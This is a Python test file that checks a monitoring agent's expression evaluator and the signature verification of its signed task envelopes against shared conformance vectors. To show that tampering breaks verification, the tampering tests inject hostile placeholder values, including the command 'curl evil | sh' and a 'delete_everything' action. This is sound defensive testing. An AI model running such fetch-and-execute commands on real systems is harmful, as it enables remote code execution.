"""The wire-protocol vectors, run against the agent's own code.

`docs/wire-protocol.md` is the prose; `protocol/conformance/*.json` are the
vectors; this is one of the two runners (the other is
`server/apps/tasks/test_conformance.py`). Both sides read the same files, so a
change to signing or to the expression language has to change the vectors in
the same commit — anything else fails here or there.

The signing half is the agent's real duty: it verifies a task envelope the way
`verify_task_signature` does on a check-in, and checks that flipping any signed
field breaks verification. The vectors' test key signs nothing real.
"""

import base64
import json
import sys
import unittest
from copy import deepcopy
from pathlib import Path

import tests._safety_net  # noqa: F401 — the guard, even when this file is run or imported on its own

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from nacl.signing import SigningKey, VerifyKey
from vigil_agent import expression
from vigil_agent.verify import verify_task_signature

VECTORS = Path(__file__).resolve().parents[2] / "protocol" / "conformance"


def _load(name: str) -> dict:
    return json.loads((VECTORS / name).read_text(encoding="utf-8"))


class ExpressionVectorTests(unittest.TestCase):
    """Every expression vector, evaluated and validated as the agent does."""

    @classmethod
    def setUpClass(cls):
        cls.cases = _load("expressions.json")["cases"]

    def test_evaluate_vectors(self):
        evaluated = [c for c in self.cases if "result" in c]
        self.assertTrue(evaluated)
        for case in evaluated:
            with self.subTest(case["name"]):
                self.assertEqual(expression.evaluate(case["expr"], case["context"]),
                                 case["result"])

    def test_validate_rejects_the_error_vectors(self):
        refused = [c for c in self.cases if c.get("error")]
        self.assertTrue(refused)
        for case in refused:
            with self.subTest(case["name"]), self.assertRaises(expression.ExprError):
                expression.validate(case["expr"])

    def test_steps_shape_vectors_are_refused_by_the_step_ref_check(self):
        """`validate` lets a misshapen `steps` read through; the server's spec
        layer refuses it, so those vectors pin `referenced_steps`."""
        shaped = [c for c in self.cases if c.get("steps_shape_error")]
        self.assertTrue(shaped)
        for case in shaped:
            with self.subTest(case["name"]), self.assertRaises(expression.ExprError):
                expression.validate(case["expr"])
                expression.referenced_steps(case["expr"])


class SigningVectorTests(unittest.TestCase):
    """The agent verifies every vector, and refuses any single-field change."""

    @classmethod
    def setUpClass(cls):
        cls.vectors = _load("signing.json")
        cls.key = VerifyKey(base64.b64decode(cls.vectors["public_key_b64"]))
        cls.token = cls.vectors["agent_token"]

    def _task_dict(self, case: dict) -> dict:
        """The envelope as check-in hands it over: the signed fields, plus the
        signature and, for v2, what tells the agent how to verify."""
        task = deepcopy(case["task"])
        task["signature"] = case["signature_b64"]
        if case["version"] == 2:
            task["sig_v"] = 2
            task["dispatched_at"] = case["dispatched_at"]
        return task

    def _verify(self, task: dict, case: dict) -> bool:
        token = self.token if case["version"] == 2 else None
        return verify_task_signature(task, self.key, agent_token=token)

    def test_public_key_is_the_seed_public_key(self):
        seed_key = SigningKey(base64.b64decode(self.vectors["seed_b64"]))
        self.assertEqual(self.vectors["public_key_b64"],
                         base64.b64encode(bytes(seed_key.verify_key)).decode())

    def test_every_vector_verifies(self):
        for case in self.vectors["cases"]:
            with self.subTest(case["name"]):
                self.assertTrue(self._verify(self._task_dict(case), case))

    def test_changing_the_action_breaks_verification(self):
        for case in self.vectors["cases"]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                task["action"] = "delete_everything"
                self.assertFalse(self._verify(task, case))

    def test_changing_one_params_value_breaks_verification(self):
        for case in self.vectors["cases"]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                params = deepcopy(task["params"])
                params[next(iter(params))] = "pkgnuke"
                task["params"] = params
                self.assertFalse(self._verify(task, case))

    def test_adding_a_params_key_breaks_verification(self):
        for case in self.vectors["cases"]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                params = deepcopy(task["params"])
                params["injected"] = "curl evil | sh"
                task["params"] = params
                self.assertFalse(self._verify(task, case))

    def test_changing_the_nonce_breaks_verification(self):
        for case in self.vectors["cases"]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                task["nonce"] = "replayed-from-an-old-task"
                self.assertFalse(self._verify(task, case))

    def test_changing_the_ttl_breaks_verification(self):
        """A relay cannot restart a task's TTL by rewriting its lifetime."""
        for case in self.vectors["cases"]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                task["ttl_seconds"] = 86_400
                self.assertFalse(self._verify(task, case))

    def test_moving_a_v1_task_to_another_host_breaks_verification(self):
        for case in [c for c in self.vectors["cases"] if c["version"] == 1]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                task["host_id"] = "11111111-1111-4111-8111-111111111111"
                self.assertFalse(self._verify(task, case))

    def test_changing_the_dispatch_time_breaks_verification(self):
        for case in [c for c in self.vectors["cases"] if c["version"] == 2]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                task["dispatched_at"] = "2020-01-01T00:00:00+00:00"
                self.assertFalse(self._verify(task, case))

    def test_a_v2_signature_for_another_agent_token_does_not_verify(self):
        for case in [c for c in self.vectors["cases"] if c["version"] == 2]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                self.assertFalse(verify_task_signature(
                    task, self.key, agent_token="some-other-agent's-token"))

    def test_a_v1_signature_checked_by_an_agent_advertising_v2_is_refused(self):
        """An agent that advertises `signed_v2` accepts only v2: taking v1 here
        would let a relay strip both the dispatch time and the binding."""
        for case in [c for c in self.vectors["cases"] if c["version"] == 1]:
            with self.subTest(case["name"]):
                self.assertTrue(verify_task_signature(
                    self._task_dict(case), self.key, agent_token=None))
                self.assertFalse(verify_task_signature(
                    self._task_dict(case), self.key, agent_token=self.token))

    def test_a_v2_claim_without_a_dispatch_time_is_refused(self):
        for case in [c for c in self.vectors["cases"] if c["version"] == 2]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                del task["dispatched_at"]
                self.assertFalse(self._verify(task, case))

    def test_a_v1_signature_with_the_v2_marker_is_refused(self):
        """`sig_v: 2` on a v1-signed envelope cannot be made to verify: the v2
        field set is different, so claiming it changes what must match."""
        for case in [c for c in self.vectors["cases"] if c["version"] == 1]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                task["sig_v"] = 2
                task["dispatched_at"] = "2026-11-16T10:00:00+00:00"
                self.assertFalse(verify_task_signature(
                    task, self.key, agent_token=self.token))

    def test_a_task_with_no_signature_is_refused(self):
        for case in self.vectors["cases"]:
            with self.subTest(case["name"]):
                task = self._task_dict(case)
                task["signature"] = ""
                self.assertFalse(self._verify(task, case))


if __name__ == "__main__":
    unittest.main()
